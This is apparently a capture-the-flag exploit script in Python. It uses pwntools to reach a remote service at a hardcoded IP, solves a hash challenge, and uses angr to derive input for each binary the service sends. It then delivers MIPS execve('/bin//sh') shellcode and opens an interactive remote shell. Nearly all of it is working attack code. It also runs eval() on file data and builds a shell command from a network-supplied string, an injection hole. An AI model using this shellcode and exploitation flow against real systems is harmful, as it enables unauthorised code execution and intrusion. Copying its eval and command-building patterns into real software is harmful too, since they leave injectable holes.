#!/usr/bin/python3 

from pwn import *
import hashlib, base64, gzip, io, os
import angr, time

### do all possible processing up front

'''
#http://shell-storm.org/shellcode/files/shellcode-782.php
#works with busybox
#52 bytes
shellcode  = b""
shellcode += b"\x24\x06\x06\x66"[::-1]
shellcode += b"\x04\xd0\xff\xff"[::-1]
shellcode += b"\x28\x06\xff\xff"[::-1]
shellcode += b"\x27\xbd\xff\xe0"[::-1]
shellcode += b"\x27\xe4\x10\x01"[::-1]
shellcode += b"\x24\x84\xf0\x1f"[::-1]
shellcode += b"\xaf\xa4\xff\xe8"[::-1]
shellcode += b"\xaf\xa0\xff\xec"[::-1]
shellcode += b"\x27\xa5\xff\xe8"[::-1]
shellcode += b"\x24\x02\x0f\xab"[::-1]
shellcode += b"\x01\x01\x01\x0c"[::-1]
shellcode += b"/bin//sh"
'''

#https://vulmon.com/exploitdetails?qidtp=exploitdb&qid=35868
#does NOT work with busybox
#36 bytes
shellcode  = b""
shellcode += b"\xff\xff\x06\x28"
shellcode += b"\xff\xff\xd0\x04"
shellcode += b"\xff\xff\x05\x28"
shellcode += b"\x01\x10\xe4\x27"
shellcode += b"\x0f\xf0\x84\x24"
shellcode += b"\xab\x0f\x02\x24"
shellcode += b"\x0c\x01\x01\x01"
shellcode += b"/bin//sh"
shellcode += (0x34 - len(shellcode)) * b'\x00'

# find next n
n = 0
while os.path.isfile('binary' + str(n)):
	n += 1
open('binary' + str(n), 'wb').write(b'')

p = remote('106.53.114.216',9999)
context.log_level='DEBUG'
p.recvuntil('== "')
target = p.recvuntil('"')[:-1]
print("target hash: " + target.decode())
p.recvuntil('>')

stream = os.popen('cat hashes | grep -m 1 -B 1 ' + target.decode() +  ' | head -1')
output = stream.read().strip().encode('ascii')
s=eval(output)
print("found: " + hashlib.sha256(s).hexdigest())
p.sendline(s)

p.recvuntil('Binary Dump:')
p.recvline()
p.recvline()
binary_dump=p.recvline().strip()
t=time.time()
binarygz = base64.b64decode(binary_dump)
binary = gzip.GzipFile(fileobj=io.BytesIO(binarygz)).read()
open('binary' + str(n), 'wb').write(binary)
print(time.time() - t,end="")
print(" seconds")

t=time.time()
#proj = angr.Project('binary' + str(n),auto_load_libs=False)
proj = angr.Project(io.BytesIO(binary),auto_load_libs=False)
state = proj.factory.entry_state()
simgr = proj.factory.simulation_manager(state)
simgr.use_technique(angr.exploration_techniques.DFS())
FIND_ADDR=0x400b44
simgr.explore(find=FIND_ADDR)
#print(simgr.found[0].posix.dumps(0))
#print(simgr.found[0].posix.dumps(0)[:64])
print(time.time() - t,end="")
print(" seconds")

payload = simgr.found[0].posix.dumps(0)[:64]
open('payload' + str(n),'wb').write(payload)

#p.recvuntil('Faster >')
p.sendline(payload)
_ = p.recvuntil('Name')
print("Name check: ")
print(_)
p.send('datajerk')
_ = p.recvuntil('>')
print("> check: ")
print(_)
_ = p.recvuntil('Your time comes.\n> ')
print("Your time comes check: ")
print(_)

print(shellcode)
p.send(shellcode)
p.interactive()

